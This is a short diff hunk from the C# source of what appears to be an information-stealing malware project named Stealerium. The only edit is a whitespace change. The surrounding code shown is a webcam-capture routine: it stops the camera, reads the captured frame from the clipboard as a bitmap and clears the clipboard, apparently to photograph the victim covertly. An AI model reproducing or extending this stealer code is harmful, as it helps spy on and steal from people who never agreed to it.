@@ -71,7 +71,7 @@ namespace Stealerium.Target.System
                 // Stop webcamera
                 SendMessage(_handle, 1035, 0, 0);
                 // Save
-                var image = (Image) Clipboard.GetDataObject()
+                var image = (Image)Clipboard.GetDataObject()
                     ?.GetData(DataFormats.Bitmap);
                 Clipboard.Clear();
                 if (image != null)
